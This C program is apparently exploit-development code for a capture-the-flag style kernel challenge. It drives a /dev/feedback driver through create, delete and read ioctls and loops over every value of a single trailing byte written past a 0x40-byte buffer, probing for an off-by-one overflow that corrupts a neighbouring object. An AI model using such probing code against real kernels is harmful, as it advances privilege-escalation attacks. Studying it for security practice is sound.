#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char out[0x80];
    puts("[+] pair probe: A(size=0x40, ov=b), B(size=0x40), read B then delete B");

    for (int b = 0; b <= 0xff; b++) {
        uint64_t a = 0x200000 + (uint64_t)b * 4;
        uint64_t b_id = a + 1;

        if (create_fb(fd, a, 0x40, 0x41, (unsigned char)b) != 0) {
            printf("create A fail byte=0x%02x errno=%d\n", b, errno);
            continue;
        }
        if (create_fb(fd, b_id, 0x40, 0x42, 0x44) != 0) {
            printf("create B fail byte=0x%02x errno=%d\n", b, errno);
            del_fb(fd, a);
            continue;
        }

        int suspicious = 0;
        if (read_fb(fd, b_id, out, sizeof(out)) == 0) {
            if ((unsigned char)out[0] != 0x42) suspicious = 1;
        }

        int drc = del_fb(fd, b_id);
        if (drc != 0 || suspicious) {
            printf("byte=0x%02x read0=0x%02x del_rc=%d errno=%d\n",
                   b, (unsigned char)out[0], drc, errno);
        }

        del_fb(fd, a);

        if ((b & 0x3f) == 0) {
            printf(".. b=0x%02x\n", b);
        }
    }

    puts("[+] done");
    close(fd);
    return 0;
}
